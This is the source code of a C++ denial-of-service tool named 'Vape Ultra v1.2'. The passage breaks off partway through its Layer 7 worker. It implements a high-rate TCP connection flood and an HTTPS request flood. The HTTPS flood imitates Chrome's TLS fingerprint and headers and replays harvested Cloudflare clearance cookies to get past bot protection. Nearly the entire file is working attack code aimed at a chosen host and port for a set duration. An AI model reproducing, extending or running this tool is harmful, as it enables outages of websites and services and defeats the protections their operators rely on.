/*
 * Vape Ultra v1.2
 * Developer: @Paxjest
 * Engine:    @Xstairs
 *
 * Combined Layer 4 TCP + Layer 7 CF_BYPASS engine.
 *
 * Usage:
 *   ./vape_ultra <host> <port> <method> [connections] [threads] [duration_sec]
 *
 * Methods:
 *   l4         — Layer 4 TCP flood (normal)
 *   l4_lownet  — Layer 4 TCP flood (minimum bandwidth, ~7x less TX)
 *   l7         — Layer 7 HTTPS CF_BYPASS (reads session.json from CWD)
 *   l7_lownet  — Layer 7 HTTPS CF_BYPASS (minimal headers, lower bandwidth)
 *
 * Layer 7 requires session.json produced by l7_harvester.py.
 *
 * Build:
 *   g++ -O3 -march=native -mtune=native -funroll-loops -fno-plt \
 *       -ffast-math -fomit-frame-pointer -std=c++17              \
 *       -o vape_ultra Vape_Ultra_1.2.cpp -lpthread -lssl -lcrypto
 */

// ─── Includes ─────────────────────────────────────────────────────────────────
#include <arpa/inet.h>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <fstream>
#include <immintrin.h>
#include <mutex>
#include <netdb.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <string>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <openssl/ssl.h>
#include <openssl/err.h>

// ─── Constants ────────────────────────────────────────────────────────────────
static constexpr int      EPOLL_BATCH     = 8192;
static constexpr int      L4_PIPELINE     = 32;
static constexpr int      L4_PIPELINE_LN  = 64;
static constexpr int      SPIN_MAX        = 2;
static constexpr int      SCAN_MS         = 200;
static constexpr int      SNDBUF          = 131072;
static constexpr int      RCVBUF          = 131072;
static constexpr int      BUSY_POLL_US    = 100;
static constexpr uint32_t DEF_CONNS       = 50000;
static constexpr uint32_t DEF_KA          = 16384;
static constexpr uint32_t DEF_TIMEOUT_MS  = 5000;
static constexpr int      SESSION_RELOAD_S = 30;    // hot-reload session every N sec
static constexpr int      SESSION_WARN_S   = 300;   // warn if session expires in < 5 min

// ─── Signal ───────────────────────────────────────────────────────────────────
static std::atomic<bool> g_running{false};
static void on_signal(int) noexcept { g_running.store(false, std::memory_order_relaxed); }

// ─── Config ───────────────────────────────────────────────────────────────────
enum class Method { L4, L4_LOWNET, L7, L7_LOWNET };

struct Config {
    std::string  host;
    std::string  resolved_ip;
    uint16_t     port        = 80;
    uint32_t     connections = DEF_CONNS;
    uint32_t     threads     = 0;
    uint32_t     duration    = 60;
    uint32_t     timeout_ms  = DEF_TIMEOUT_MS;
    uint32_t     keepalive   = DEF_KA;
    bool         pin_cpu     = true;
    bool         realtime    = true;
    Method       method      = Method::L4;
};

// ─── Stats ────────────────────────────────────────────────────────────────────
struct alignas(64) Stats {
    std::atomic<uint64_t> requests{0};
    std::atomic<uint64_t> errors  {0};
    std::atomic<uint64_t> bytes_tx{0};
    std::atomic<uint64_t> bytes_rx{0};
    char _pad[64 - 4*8];
};

// ─── Session (L7) ─────────────────────────────────────────────────────────────
struct Session {
    std::string host;
    std::string path;
    std::string user_agent;
    std::string cookie_header;   // full Cookie: header value
    uint16_t    port        = 443;
    int64_t     valid_until = 0;  // unix timestamp, 0 = unknown
    uint64_t    version     = 0;  // incremented on update
};

static std::mutex             g_session_mtx;
static Session                g_session;
static std::atomic<uint64_t>  g_session_ver{0};
static std::string            g_session_file = "session.json";

// ── simple flat JSON string extractor ────────────────────────────────────────
static std::string json_str(const std::string& j, const char* key) {
    std::string k1 = std::string("\"") + key + "\":\"";
    std::string k2 = std::string("\"") + key + "\": \"";
    size_t p = j.find(k1);
    size_t klen = k1.size();
    if (p == std::string::npos) { p = j.find(k2); klen = k2.size(); }
    if (p == std::string::npos) return "";
    p += klen;
    std::string out;
    out.reserve(512);
    while (p < j.size() && j[p] != '"') {
        if (j[p] == '\\' && p + 1 < j.size()) {
            ++p;
            switch (j[p]) {
                case '"':  out += '"';  break;
                case '\\': out += '\\'; break;
                case '/':  out += '/';  break;
                case 'n':  out += '\n'; break;
                case 'r':  out += '\r'; break;
                case 't':  out += '\t'; break;
                default:   out += j[p]; break;
            }
        } else {
            out += j[p];
        }
        ++p;
    }
    return out;
}

static int64_t json_int(const std::string& j, const char* key) {
    std::string k1 = std::string("\"") + key + "\":";
    std::string k2 = std::string("\"") + key + "\": ";
    size_t p = j.find(k1);
    size_t klen = k1.size();
    if (p == std::string::npos) { p = j.find(k2); klen = k2.size(); }
    if (p == std::string::npos) return 0;
    p += klen;
    while (p < j.size() && j[p] == ' ') ++p;
    if (p >= j.size()) return 0;
    return std::strtoll(j.c_str() + p, nullptr, 10);
}

// ── load session.json into g_session ─────────────────────────────────────────
static bool session_load() {
    std::ifstream f(g_session_file);
    if (!f.is_open()) return false;
    std::string json((std::istreambuf_iterator<char>(f)),
                      std::istreambuf_iterator<char>());
    if (json.empty()) return false;

    Session s;
    s.host          = json_str(json, "host");
    s.path          = json_str(json, "path");
    s.user_agent    = json_str(json, "user_agent");
    s.cookie_header = json_str(json, "cookie_header");
    int64_t p       = json_int(json, "port");
    s.port          = p > 0 ? (uint16_t)p : 443;
    s.valid_until   = json_int(json, "valid_until");
    if (s.path.empty()) s.path = "/";

    if (s.host.empty() || s.cookie_header.empty()) return false;

    {
        std::lock_guard<std::mutex> lk(g_session_mtx);
        s.version = g_session.version + 1;
        g_session  = s;
    }
    g_session_ver.store(s.version, std::memory_order_release);
    return true;
}

// ── background session refresh thread ────────────────────────────────────────
static void session_watch_thread() {
    while (g_running.load(std::memory_order_relaxed)) {
        for (int i = 0; i < SESSION_RELOAD_S && g_running.load(std::memory_order_relaxed); ++i)
            std::this_thread::sleep_for(std::chrono::seconds(1));
        if (!g_running.load(std::memory_order_relaxed)) break;
        if (session_load())
            std::fprintf(stderr, "[L7] session hot-reloaded from %s\n", g_session_file.c_str());
        int64_t now = (int64_t)std::time(nullptr);
        int64_t vu  = 0;
        { std::lock_guard<std::mutex> lk(g_session_mtx); vu = g_session.valid_until; }
        if (vu > 0 && (vu - now) < SESSION_WARN_S)
            std::fprintf(stderr, "[L7] WARNING: session expires in %llds — re-harvest soon!\n",
                         (long long)(vu - now));
    }
}

// ─── Common helpers ───────────────────────────────────────────────────────────
static thread_local int64_t tl_us = 0;
static thread_local int64_t tl_ms = 0;

__attribute__((always_inline))
static inline void tick() noexcept {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_COARSE, &ts);
    tl_us = ts.tv_sec * 1'000'000LL + ts.tv_nsec / 1000LL;
    tl_ms = ts.tv_sec * 1000LL      + ts.tv_nsec / 1'000'000LL;
}

static sockaddr_in do_resolve(const std::string& host, uint16_t port, std::string& ip_out) {
    addrinfo hints{};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res     = nullptr;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) || !res) _exit(1);
    sockaddr_in addr{};
    std::memcpy(&addr, res->ai_addr, sizeof(addr));
    addr.sin_port = htons(port);
    char buf[INET_ADDRSTRLEN]{};
    inet_ntop(AF_INET, &addr.sin_addr, buf, sizeof(buf));
    ip_out = buf;
    freeaddrinfo(res);
    return addr;
}

static uint64_t raise_fds(uint64_t need) {
    struct rlimit rl{};
    getrlimit(RLIMIT_NOFILE, &rl);
    uint64_t want = need + 2048;
    if (rl.rlim_cur < want) {
        rl.rlim_cur = (want < (uint64_t)rl.rlim_max) ? want : (uint64_t)rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
        getrlimit(RLIMIT_NOFILE, &rl);
    }
    return rl.rlim_cur;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  LAYER 4 ENGINE  (Vape-1.1 — preserved exactly)
// ═══════════════════════════════════════════════════════════════════════════════

static constexpr char L4_HTTP_FMT[] =
    "GET / HTTP/1.1\r\n"
    "Host: %s\r\n"
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    "Accept-Language: en-US,en;q=0.5\r\n"
    "Accept-Encoding: identity\r\n"
    "Cache-Control: no-cache\r\n"
    "Pragma: no-cache\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";

static constexpr char L4_HTTP_FMT_LN[] =
    "GET / HTTP/1.1\r\n"
    "Host: %s\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";

struct alignas(64) L4Conn {
    int     fd        = -1;
    int32_t req_count = 0;
    int64_t opened_us = 0;
    int64_t sent_us   = 0;
    bool    connected = false;
    uint8_t _pad[7];
};

__attribute__((always_inline))
static inline int make_tcp_sock() noexcept {
    int fd = ::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, IPPROTO_TCP);
    if (__builtin_expect(fd < 0, 0)) return -1;
    static constexpr int ONE  = 1;
    static constexpr struct linger LG = {1, 0};
    static constexpr int SND = SNDBUF, RCV = RCVBUF, BP = BUSY_POLL_US;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY,          &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_REUSEPORT,         &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_LINGER,            &LG,  sizeof(LG));
    setsockopt(fd, IPPROTO_TCP, TCP_QUICKACK,         &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_BUSY_POLL,         &BP,  sizeof(BP));
    setsockopt(fd, SOL_SOCKET,  SO_SNDBUF,            &SND, sizeof(SND));
    setsockopt(fd, SOL_SOCKET,  SO_RCVBUF,            &RCV, sizeof(RCV));
    setsockopt(fd, IPPROTO_TCP, TCP_FASTOPEN_CONNECT, &ONE, sizeof(ONE));
    return fd;
}

struct L4WCtx {
    const Config&      cfg;
    const sockaddr_in& addr;
    Stats&             stats;
    const char*        payload;
    size_t             payload_len;
    std::vector<iovec> iov;
    uint32_t           n;
    int                cpu;
};

static void l4_worker(L4WCtx ctx) {
    if (ctx.cpu >= 0) {
        cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(ctx.cpu, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
    }
    if (ctx.cfg.realtime) {
        sched_param sp{}; sp.sched_priority = 99;
        pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
    }

    const Config&      cfg   = ctx.cfg;
    const sockaddr_in& addr  = ctx.addr;
    Stats&             stats = ctx.stats;
    const uint32_t     N     = ctx.n;
    const char*        pdata = ctx.payload;
    const size_t       plen  = ctx.payload_len;
    const int          PD    = (int)ctx.iov.size();
    iovec*             iov   = ctx.iov.data();

    static thread_local uint8_t rbuf[262144];
    int epfd = epoll_create1(EPOLL_CLOEXEC);
    if (epfd < 0) return;

    std::vector<L4Conn> conns(N);

    auto open_conn = [&](uint32_t idx) __attribute__((always_inline)) {
        L4Conn& c = conns[idx];
        if (c.fd >= 0) { epoll_ctl(epfd, EPOLL_CTL_DEL, c.fd, nullptr); ::close(c.fd); c.fd = -1; }
        c.connected = false; c.req_count = 0;
        int fd = make_tcp_sock();
        if (__builtin_expect(fd < 0, 0)) { stats.errors.fetch_add(1, std::memory_order_relaxed); return; }
        int rc = ::connect(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr));
        if (__builtin_expect(rc < 0 && errno != EINPROGRESS, 0)) {
            stats.errors.fetch_add(1, std::memory_order_relaxed); ::close(fd); return;
        }
        c.fd = fd; c.opened_us = tl_us; c.sent_us = tl_us;
        epoll_event ev{}; ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP | EPOLLET; ev.data.u32 = idx;
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    };

    auto send_burst = [&](L4Conn& c) __attribute__((always_inline)) {
        int budget = std::min(PD, (int)cfg.keepalive - c.req_count);
        if (__builtin_expect(budget <= 0, 0)) return;
        c.sent_us = tl_us;
        ssize_t ns = (budget == 1) ? ::send(c.fd, pdata, plen, MSG_NOSIGNAL | MSG_DONTWAIT)
                                   : ::writev(c.fd, iov, budget);
        if (__builtin_expect(ns > 0, 1)) {
            int sent = (int)((size_t)ns / plen); if (sent < 1) sent = 1;
            stats.requests.fetch_add((uint64_t)sent, std::memory_order_relaxed);
            stats.bytes_tx.fetch_add((uint64_t)ns,   std::memory_order_relaxed);
            c.req_count += sent;
        }
    };

    auto rearm_rd = [&](L4Conn& c, uint32_t idx) __attribute__((always_inline)) {
        epoll_event ev{};
        ev.events = EPOLLIN | EPOLLRDHUP | EPOLLERR | EPOLLHUP | EPOLLET; ev.data.u32 = idx;
        epoll_ctl(epfd, EPOLL_CTL_MOD, c.fd, &ev);
    };

    tick();
    for (uint32_t i = 0; i < N; ++i) open_conn(i);

    epoll_event evbuf[EPOLL_BATCH];
    int64_t last_scan = tl_ms;
    int     idle      = 0;

    while (__builtin_expect(g_running.load(std::memory_order_acquire), 1)) {
        int timeout = idle > SPIN_MAX ? 1 : 0;
        if (idle > 0 && idle <= SPIN_MAX) _mm_pause();
        int n = epoll_wait(epfd, evbuf, EPOLL_BATCH, timeout);
        tick();
        if (__builtin_expect(n == 0, 0)) { ++idle; continue; }
        idle = 0;

        for (int i = 0; i < n; ++i) {
            const uint32_t idx = evbuf[i].data.u32;
            const uint32_t em  = evbuf[i].events;
            L4Conn& c = conns[idx];

            if (__builtin_expect(!!(em & (EPOLLERR | EPOLLHUP)), 0)) {
                stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(idx); continue;
            }
            if (__builtin_expect(!c.connected, 0)) {
                int err = 0; socklen_t el = sizeof(err);
                getsockopt(c.fd, SOL_SOCKET, SO_ERROR, &err, &el);
                if (__builtin_expect(err != 0, 0)) {
                    stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(idx); continue;
                }
                c.connected = true;
                static constexpr int ONE = 1;
                setsockopt(c.fd, IPPROTO_TCP, TCP_QUICKACK, &ONE, sizeof(ONE));
                send_burst(c); rearm_rd(c, idx); continue;
            }
            if (__builtin_expect(!!(em & EPOLLRDHUP), 0)) { open_conn(idx); continue; }
            if (__builtin_expect(!!(em & EPOLLIN), 1)) {
                uint64_t rx = 0; bool closed = false;
                while (true) {
                    ssize_t nr = ::recv(c.fd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
                    if (__builtin_expect(nr > 0, 1)) { rx += (uint64_t)nr; }
                    else if (nr == 0) { closed = true; break; }
                    else { if (errno == EAGAIN || errno == EWOULDBLOCK) break; closed = true; break; }
                }
                if (rx) stats.bytes_rx.fetch_add(rx, std::memory_order_relaxed);
                if (__builtin_expect(closed, 0)) { open_conn(idx); continue; }
                if (__builtin_expect(c.req_count >= (int32_t)cfg.keepalive, 0)) open_conn(idx);
                else send_burst(c);
            }
        }

        if (__builtin_expect(tl_ms - last_scan >= SCAN_MS, 0)) {
            last_scan = tl_ms;
            const int64_t tmo = (int64_t)cfg.timeout_ms;
            for (uint32_t i = 0; i < N; ++i) {
                L4Conn& c = conns[i];
                if (__builtin_expect(c.fd < 0, 0)) { open_conn(i); continue; }
                int64_t age = tl_us - (c.connected ? c.sent_us : c.opened_us);
                if (age > tmo * 1000LL) { stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(i); }
            }
        }
    }

    for (uint32_t i = 0; i < N; ++i)
        if (conns[i].fd >= 0) { ::close(conns[i].fd); conns[i].fd = -1; }
    ::close(epfd);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  LAYER 7 ENGINE  — OpenSSL + Chrome fingerprint + cf_clearance injection
// ═══════════════════════════════════════════════════════════════════════════════

// Chrome 124 cipher string for OpenSSL
static constexpr const char* CHROME_CIPHERS =
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:"
    "AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA";

static constexpr const char* CHROME_TLS13_CIPHERS =
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256";

// ALPN: prefer HTTP/2 then HTTP/1.1 (Chrome order)
static constexpr unsigned char ALPN_PROTOS[] =
    "\x02h2\x08http/1.1";

// L7 connection state
enum L7CS : uint8_t {
    L7CS_INIT       = 0,
    L7CS_CONNECTING,
    L7CS_TLS,
    L7CS_SENDING,
    L7CS_RECEIVING,
};

struct alignas(64) L7Conn {
    int         fd          = -1;
    SSL*        ssl         = nullptr;
    L7CS        state       = L7CS_INIT;
    int32_t     req_count   = 0;
    int64_t     last_act_us = 0;
    int32_t     write_pos   = 0;   // position in current write
    int32_t     write_len   = 0;   // total bytes to write
    uint8_t     _pad[8];
};

// Build per-thread request buffers from session
static void l7_build_request(
    const Session& s, bool lownet,
    std::string& buf_out, std::vector<iovec>& iov_out, int pipeline)
{
    std::string req;
    req.reserve(1024);
    req  = "GET "; req += s.path; req += " HTTP/1.1\r\n";
    req += "Host: "; req += s.host; req += "\r\n";
    req += "User-Agent: "; req += s.user_agent; req += "\r\n";

    if (!lownet) {
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,*/*;q=0.8\r\n";
        req += "Accept-Language: en-US,en;q=0.9\r\n";
        req += "Accept-Encoding: gzip, deflate, br\r\n";
        req += "Cache-Control: no-cache\r\n";
        req += "Pragma: no-cache\r\n";
        req += "sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"\r\n";
        req += "sec-ch-ua-mobile: ?0\r\n";
        req += "sec-ch-ua-platform: \"Windows\"\r\n";
        req += "Upgrade-Insecure-Requests: 1\r\n";
        req += "Sec-Fetch-Site: none\r\n";
        req += "Sec-Fetch-Mode: navigate\r\n";
        req += "Sec-Fetch-User: ?1\r\n";
        req += "Sec-Fetch-Dest: document\r\n";
    }

    req += "Cookie: "; req += s.cookie_header; req += "\r\n";
    req += "Connection: keep-alive\r\n\r\n";

    size_t rlen = req.size();
    buf_out.clear();
    buf_out.reserve(rlen * (size_t)pipeline);
    for (int i = 0; i < pipeline; ++i) buf_out += req;

    iov_out.resize((size_t)pipeline);
    for (int i = 0; i < pipeline; ++i) {
        iov_out[i].iov_base = const_cast<char*>(buf_out.data() + (size_t)i * rlen);
        iov_out[i].iov_len  = rlen;
    }
}

// Per-thread SSL context (one CTX is fine to share, but thread-local avoids lock contention)
static SSL_CTX* make_ssl_ctx() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return nullptr;

    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_cipher_list(ctx, CHROME_CIPHERS);
    SSL_CTX_set_ciphersuites(ctx, CHROME_TLS13_CIPHERS);
    SSL_CTX_set_mode(ctx,
        SSL_MODE_ENABLE_PARTIAL_WRITE |
        SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
        SSL_MODE_RELEASE_BUFFERS);
    SSL_CTX_set_options(ctx,
        SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 |
        SSL_OP_NO_COMPRESSION);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

    // ALPN
    SSL_CTX_set_alpn_protos(ctx, ALPN_PROTOS, sizeof(ALPN_PROTOS) - 1);

    // Session caching for faster reconnects
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT);

    return ctx;
}

struct L7WCtx {
    const Config&      cfg;
    const sockaddr_in& addr;
    Stats&             stats;
    uint32_t           n;
    int                cpu;
    bool               lownet;
};

// Re-arm helper for EPOLLONESHOT
static inline void l7_rearm(int epfd, int fd, uint32_t idx, uint32_t events) noexcept {
    epoll_event ev{};
    ev.events   = events | EPOLLONESHOT | EPOLLERR | EPOLLHUP;
    ev.data.u32 = idx;
    epoll_ctl(epfd, EPOLL_CTL_MOD, fd, &ev);
}

static void l7_worker(L7WCtx ctx) {
    if (ctx.cpu >= 0) {
        cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(ctx.cpu, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
    }
    if (ctx.cfg.realtime) {
        sched_param sp{}; sp.sched_priority = 99;
        pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
    }

    const Config&      cfg    = ctx.cfg;
    const sockaddr_in& addr   = ctx.addr;
    Stats&             stats  = ctx.stats;
    const uint32_t     N      = ctx.n;

    // Session local copy
    uint64_t  local_ver = UINT64_MAX;
    Session   local_sess;
    std::string req_buf;
    std::vector<iovec> req_iov;

    static constexpr int PIPELINE_L7    = 8;   // HTTP/1.1 pipeline depth per connection
    static constexpr int PIPELINE_L7_LN = 16;
    const int PD = ctx.lownet ? PIPELINE_L7_LN : PIPELINE_L7;

    SSL_CTX* ssl_ctx = make_ssl_ctx();
    if (!ssl_ctx) return;

    int epfd = epoll_create1(EPOLL_CLOEXEC);
    if (epfd < 0) { SSL_CTX_free(ssl_ctx); return; }

    std::vector<L7Conn> conns(N);
    static thread_local uint8_t rbuf[65536];

    // ── open / reopen a connection ────────────────────────────────────────────
    auto close_conn = [&](uint32_t idx) {
        L7Conn& c = conns[idx];
        if (c.ssl) {
            SSL_shutdown(c.ssl);
            SSL_free(c.ssl);
            c.ssl = nullptr;
        }
        if (c.fd >= 0) {
            epoll_ctl(epfd, EPOLL_CTL_DEL, c.fd, nullptr);
            ::close(c.fd);
            c.fd = -1;
        }
        c.state     = L7CS_INIT;
        c.req_count = 0;
        c.write_pos = 0;
        c.write_len = 0;
    };

    auto open_conn = [&](uint32_t idx) {
        close_conn(idx);
        L7Conn& c = conns[idx];

        int fd = ::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, IPPROTO_TCP);
        if (fd < 0) { stats.errors.fetch_add(1, std::memory_order_relaxed); return; }

        static constexpr int ONE = 1;
        static constexpr struct linger LG = {1, 0};
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY,  &ONE, sizeof(ONE));
        setsockopt(fd, SOL_SOCKET,  SO_REUSEPORT, &ONE, sizeof(ONE));
        setsockopt(fd, SOL_SOCKET,  SO_LINGER,    &LG,  sizeof(LG));
        static constexpr int SND = SNDBUF, RCV = RCVBUF;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &SND, sizeof(SND));
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &RCV, sizeof(RCV));

        int rc = ::connect(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr));
        if (rc < 0 && errno != EINPROGRESS) {
            ::close(fd);
            stats.errors.fetch_add(1, std::memory_order_relaxed);
            return;
        }

        c.fd         = fd;
        c.state      = L7CS_CONNECTING;
        c.last_act_us = tl_us;

        epoll_event ev{};
        ev.events   = EPOLLOUT | EPOLLONESHOT | EPOLLERR | EPOLLHUP;
        ev.data.u32 = idx;
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    };

    // ── start TLS handshake after TCP connect ─────────────────────────────────
    auto begin_tls = [&](uint32_t idx) {
        L7Conn& c = conns[idx];
        SSL* ssl = SSL_new(ssl_ctx);
        if (!ssl) { close_conn(idx); stats.errors.fetch_add(1, std::memory_order_relaxed); return; }

        SSL_set_fd(ssl, c.fd);
        SSL_set_tlsext_host_name(ssl, local_sess.host.c_str());
        SSL_set_connect_state(ssl);

        c.ssl   = ssl;
        c.state = L7CS_TLS;

        int r = SSL_connect(ssl);
        if (r == 1) {
            // Immediate success (rare with non-blocking, but handle it)
            c.state = L7CS_SENDING;
            c.write_pos = 0;
            c.write_len = (int32_t)(req_buf.size() / (size_t)PD); // one request length
            l7_rearm(epfd, c.fd, idx, EPOLLOUT);
            return;
        }
        int err = SSL_get_error(ssl, r);
        if (err == SSL_ERROR_WANT_READ) {
            l7_rearm(epfd, c.fd, idx, EPOLLIN);
        } else if (err == SSL_ERROR_WANT_WRITE) {
            l7_rearm(epfd, c.fd, idx, EPOLLOUT);
        } else {
            close_conn(idx);
            stats.errors.fetch_add(1, std::memory_order_relaxed);
            open_conn(idx);
        }
    };

    tick();
    for (uint32_t i = 0; i < N; ++i) open_conn(i);

    epoll_event evbuf[EPOLL_BATCH];
    int64_t last_scan = tl_ms;

    while (__builtin_expect(g_running.load(std::memory_order_acquire), 1)) {
        // ── hot-reload session if updated ─────────────────────────────────────
        uint64_t sv = g_session_ver.load(std::memory_order_acquire);
        if (sv != local_ver) {
            {
                std::lock_guard<std::mutex> lk(g_session_mtx);
                local_sess = g_session;
            }
            local_ver = sv;
            int rlen = ctx.lownet ? PIPELINE_L7_LN : PIPELINE_L7;
            l7_build_request(local_sess, ctx.lownet, req_buf, req_iov, rlen);
        }

        if (req_buf.empty()) {
            // No valid session yet — wait and retry
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        int n = epoll_wait(epfd, evbuf, EPOLL_BATCH, 1);
        tick();

        for (int i = 0; i < n; ++i) {
            const uint32_t idx = evbuf[i].data.u32;
            const uint32_t em  = evbuf[i].events;
            L7Conn& c = conns[idx];

            if (c.fd < 0) { open_conn(idx); continue; }

            // Hard error
            if ((em & (EPOLLERR | EPOLLHUP)) && c.state != L7CS_TLS) {
                stats.errors.fetch_add(1, std::memory_order_relaxed);
                close_conn(idx); open_conn(idx); continue;
            }

            switch (c.state) {
            case L7CS_CONNECTING: {
                // TCP connect complete
                int err = 0; socklen_t el = sizeof(err);
                getsockopt(c.fd, SOL_SOCKET, SO_ERROR, &err, &el);
                if (err != 0) {
                    stats.errors.fetch_add(1, std::memory_order_relaxed);
                    close_conn(idx); open_conn(idx);
                } else {
                    begin_tls(idx);
                }
                break;
            }

            case L7CS_TLS: {
                // Continue TLS handshake
                int r = SSL_connect(c.ssl);
                if (r == 1) {
                    // Handshake done — start sending
                    size_t single_req_len = req_buf.size() / (size_t)PD;
                    c.state     = L7CS_SENDING;
                    c.write_pos = 0;
                    c.write_len = (int32_t)single_req_len;
                    l7_rearm(epfd, c.fd, idx, EPOLLOUT);
                } else {
                    int err = SSL_get_error(c.ssl, r);
                    if (err == SSL_ERROR_WANT_READ)       l7_rearm(epfd, c.fd, idx, EPOLLIN);
                    else if (err == SSL_ERROR_WANT_WRITE) l7_rearm(epfd, c.fd, idx, EPOLLOUT);
                    else {
                        stats.errors.fetch_add(1, std::memory_order_relaxed);
                        close_conn(idx); open_conn(idx);
                    }
                }
                break;
            }

            case L7CS_SENDING: {
                // Send pipelined requests
                const char* data = req_buf.data();
                int total_len    = (int)req_buf.size();
                while (c.write_pos < total_len) {
                    int to_write = std::min(65536, total_len - c.write_pos);
                    int r = SSL_write(c.ssl, data + c.write_pos, to_write);
                    if (r > 0) {
                        stats.bytes_tx.fetch_add((uint64_t)r, std::memory_order_relaxed);
                        c.write_pos += r;
                    } else {
                        int err = SSL_get_error(c.ssl, r);
                        if (err == SSL_ERROR_WANT_WRITE) {
                            l7_rearm(epfd, c.fd, idx, EPOLLOUT); goto next_event;
                        } else if (err == SSL_ERROR_WANT_READ) {
                            l7_rearm(epfd, c.fd, idx, EPOLLIN);  goto next_event;
                        } else {
                            stats.errors.fetch_add(1, std::memory_order_relaxed);
                            close_conn(idx); open_conn(idx); goto next_event;
                        }
                    }
                }
                // All sent — switch to receiving
                c.state     = L7CS_RECEIVING;
                c.last_act_us = tl_us;
                l7_rearm(epfd, c.fd, idx, EPOLLIN);
                break;
            }

            case L7CS_RECEIVING: {
                // Drain response — keep reading until WANT_READ
                bool conn_closed = false;
                while (true) {
                    int r = SSL_read(c.ssl, rbuf, sizeof(rbuf));
                    if (r > 0) {
                        stats.bytes_rx.fetch_add((uint64_t)r, std::memory_order_relaxed);
                        c.last_act_us = tl_us;
                    } else if (r == 0) {
                        conn_closed = true; break;
                    } else {
                        int err = SSL_get_error(c.ssl, r);
                        if (err == SSL_ERROR_WANT_READ) {
                            // No more data right now — response drained, send next batch
                            break;
                        } else if (err == SSL_ERROR_WANT_WRITE) {
                            l7_rearm(epfd, c.fd, idx, EPOLLOUT); goto next_event;
                        } else {
                            conn_closed = true; break;
                        }
                    }
                }
                if (conn_closed) {
                    close_conn(idx); open_conn(idx); goto next_event;
                }
                // Count pipelined requests as sent (PD requests per send cycle)
                stats.requests.fetch_add((uint64_t)PD, std::memory_order_relaxed);
                c.req_count += PD;

                if (c.req_count >= (int32_t)cfg.keepalive) {
                    // Exceeded keepalive — reconnect with fresh TLS
                    close_conn(idx); open_conn(idx);
                } else {
                    // Re-send next pipeline batch
                    c.state     = L7CS_SENDING;
                    c.write_pos = 0;
                    c.write_len = (int32_t)req_buf.size();
                    l7_rearm(epfd, c.fd, idx, EPOLLOUT);
                }
                break;
            }

            default:
                break;
            }
            next_event:;
        }

        // ── Timeout scan ──────────────────────────────────────────────────────
        if (__builtin_expect(tl_ms - last_scan >= SCAN_MS, 0)) {
            last_scan = tl_ms;
            const int64_t tmo = (int64_t)cfg.timeout_ms * 1000LL;
            for (uint32_t i = 0; i < N; ++i) {
                L7Conn& c = conns[i];
                if (c.fd < 0) { open_conn(i); continue; }
                if (c.state != L7CS_INIT && (tl_us - c.last_act_us) > tmo) {
                    stats.errors.fetch_add(1, std::memory_order_relaxed);
